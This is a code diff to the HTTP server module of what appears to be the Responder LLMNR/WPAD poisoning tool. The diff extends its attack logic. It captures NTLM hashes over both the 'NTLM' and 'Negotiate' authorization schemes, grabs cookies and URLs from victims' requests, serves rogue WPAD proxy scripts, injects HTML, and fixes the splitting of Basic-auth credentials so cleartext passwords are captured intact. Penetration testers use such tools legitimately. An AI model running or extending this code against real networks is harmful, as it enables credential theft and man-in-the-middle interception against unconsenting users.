@@ -96,26 +96,9 @@ def GrabReferer(data, host):
 		return Referer
 	return False
 
-def SpotFirefox(data):
-	UserAgent = re.findall(r'(?<=User-Agent: )[^\r]*', data)
-	if UserAgent:
-		print(text("[HTTP] %s" % color("User-Agent        : "+UserAgent[0], 2)))
-		IsFirefox = re.search('Firefox', UserAgent[0])
-		if IsFirefox:
-			print(color("[WARNING]: Mozilla doesn't switch to fail-over proxies (as it should) when one's failing.", 1))
-			print(color("[WARNING]: The current WPAD script will cause disruption on this host. Sending a dummy wpad script (DIRECT connect)", 1))
-			return True
-		else:
-			return False
-
 def WpadCustom(data, client):
 	Wpad = re.search(r'(/wpad.dat|/*\.pac)', data)
-	if Wpad and SpotFirefox(data):
-		Buffer = WPADScript(Payload="function FindProxyForURL(url, host){return 'DIRECT';}")
-		Buffer.calculate()
-		return str(Buffer)
-
-	if Wpad and SpotFirefox(data) == False:
+	if Wpad:
 		Buffer = WPADScript(Payload=settings.Config.WPAD_Script)
 		Buffer.calculate()
 		return str(Buffer)
@@ -167,6 +150,7 @@ def GrabURL(data, host):
 # Handle HTTP packet sequence.
 def PacketSequence(data, client, Challenge):
 	NTLM_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
+	NTLM_Auth2 = re.findall(r'(?<=Authorization: Negotiate )[^\r]*', data)
 	Basic_Auth = re.findall(r'(?<=Authorization: Basic )[^\r]*', data)
 
 	# Serve the .exe if needed
@@ -193,11 +177,41 @@ def PacketSequence(data, client, Challenge):
 			Buffer.calculate()
 
 			Buffer_Ans = IIS_NTLM_Challenge_Ans(Payload = b64encode(NetworkSendBufferPython2or3(Buffer)).decode('latin-1'))
-			#Buffer_Ans.calculate(Buffer)
+			Buffer_Ans.calculate()
 			return Buffer_Ans
 
 		if Packet_NTLM == b'\x03':
 			NTLM_Auth = b64decode(''.join(NTLM_Auth))
+			if IsWebDAV(data):
+                                 module = "WebDAV"
+			else:
+                                 module = "HTTP"
+			ParseHTTPHash(NTLM_Auth, Challenge, client, module)
+
+			if settings.Config.Force_WPAD_Auth and WPAD_Custom:
+				print(text("[HTTP] WPAD (auth) file sent to %s" % client.replace("::ffff:","")))
+
+				return WPAD_Custom
+			else:
+				Buffer = IIS_Auth_Granted(Payload=settings.Config.HtmlToInject)
+				Buffer.calculate()
+				return Buffer
+				
+	elif NTLM_Auth2:
+		Packet_NTLM = b64decode(''.join(NTLM_Auth2))[8:9]
+		if Packet_NTLM == b'\x01':
+			GrabURL(data, client)
+			#GrabReferer(data, client)
+			GrabCookie(data, client)
+
+			Buffer = NTLM_Challenge(ServerChallenge=NetworkRecvBufferPython2or3(Challenge))
+			Buffer.calculate()
+			Buffer_Ans = IIS_NTLM_Challenge_Ans(WWWAuth = "WWW-Authenticate: Negotiate ", Payload = b64encode(NetworkSendBufferPython2or3(Buffer)).decode('latin-1'))
+			Buffer_Ans.calculate()
+			return Buffer_Ans
+
+		if Packet_NTLM == b'\x03':
+			NTLM_Auth = b64decode(''.join(NTLM_Auth2))
 			if IsWebDAV(data):
                                  module = "WebDAV"
 			else:
@@ -224,8 +238,8 @@ def PacketSequence(data, client, Challenge):
 			'module': 'HTTP', 
 			'type': 'Basic', 
 			'client': client, 
-			'user': ClearText_Auth.decode('latin-1').split(':')[0], 
-			'cleartext': ClearText_Auth.decode('latin-1').split(':')[1], 
+			'user': ClearText_Auth.decode('latin-1').split(':', maxsplit=1)[0], 
+			'cleartext': ClearText_Auth.decode('latin-1').split(':', maxsplit=1)[1], 
 			})
 
 		if settings.Config.Force_WPAD_Auth and WPAD_Custom:
@@ -239,12 +253,16 @@ def PacketSequence(data, client, Challenge):
 			return Buffer
 	else:
 		if settings.Config.Basic:
-			Response = IIS_Basic_401_Ans()
+			r = IIS_Basic_401_Ans()
+			r.calculate()
+			Response = r
 			if settings.Config.Verbose:
 				print(text("[HTTP] Sending BASIC authentication request to %s" % client.replace("::ffff:","")))
 
 		else:
-			Response = IIS_Auth_401_Ans()
+			r = IIS_Auth_401_Ans()
+			r.calculate()
+			Response = r
 			if settings.Config.Verbose:
 				print(text("[HTTP] Sending NTLM authentication request to %s" % client.replace("::ffff:","")))
 
